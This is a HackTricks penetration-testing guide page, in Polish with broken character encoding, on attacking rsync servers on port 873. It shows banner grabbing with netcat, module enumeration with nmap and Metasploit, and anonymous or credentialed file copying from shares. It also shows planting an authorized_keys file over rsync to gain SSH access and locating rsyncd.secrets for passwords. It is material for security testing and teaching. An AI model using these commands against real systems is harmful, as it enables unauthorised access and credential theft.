# 873 - Pentesting Rsync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

Z [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** to narzdzie do efektywnego [przesyania](https://en.wikipedia.org/wiki/File\_transfer) i [synchronizowania](https://en.wikipedia.org/wiki/File\_synchronization) [plik贸w](https://en.wikipedia.org/wiki/Computer\_file) midzy komputerem a zewntrznym dyskiem twardym oraz w sieci [komputer贸w](https://en.wikipedia.org/wiki/Computer) poprzez por贸wnywanie [czas贸w modyfikacji](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) i rozmiar贸w plik贸w.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) Jest powszechnie stosowany w systemach [operacyjnych](https://en.wikipedia.org/wiki/Operating\_system) podobnych do [Unix](https://en.wikipedia.org/wiki/Unix-like). Algorytm rsync to rodzaj [kodowania delta](https://en.wikipedia.org/wiki/Delta\_encoding) i jest u偶ywany do minimalizowania wykorzystania sieci. [Zlib](https://en.wikipedia.org/wiki/Zlib) mo偶e by u偶ywany do dodatkowej [kompresji danych](https://en.wikipedia.org/wiki/Data\_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) a [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) lub [stunnel](https://en.wikipedia.org/wiki/Stunnel) mog by u偶ywane dla bezpieczestwa.

**Domylny port:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Enumeracja

### Baner i komunikacja rczna
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Enumerowanie Wsp贸lnych Folder贸w**

**Moduy Rsync** s rozpoznawane jako **udostpnione katalogi**, kt贸re mog by **chronione hasami**. Aby zidentyfikowa dostpne moduy i sprawdzi, czy wymagaj hase, u偶ywane s nastpujce polecenia:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Bd藕 wiadomy, 偶e niekt贸re udostpnienia mog nie pojawi si na licie, co mo偶e je ukrywa. Dodatkowo, dostp do niekt贸rych udostpnie mo偶e by ograniczony do okrelonych **credentials**, co jest wskazywane przez komunikat **"Access Denied"**.

### [**Brute Force**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Rczne u偶ycie Rsync

Po uzyskaniu **module list**, dziaania zale偶 od tego, czy wymagana jest autoryzacja. Bez autoryzacji, **listing** i **copying** plik贸w z udostpnionego folderu do lokalnego katalogu osiga si poprzez:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Ten proces **rekursywnie przesya pliki**, zachowujc ich atrybuty i uprawnienia.

Z **danymi uwierzytelniajcymi**, wylistowanie i pobranie z udostpnionego folderu mo偶na wykona w nastpujcy spos贸b, gdzie pojawi si monit o haso:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Aby **przesa zawarto**, tak jak plik _**authorized_keys**_ do uzyskania dostpu, u偶yj:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Aby zlokalizowa plik konfiguracyjny rsyncd, wykonaj:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
W tym pliku parametr _secrets file_ mo偶e wskazywa na plik zawierajcy **nazwy u偶ytkownik贸w i hasa** do uwierzytelniania rsyncd.

## References
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
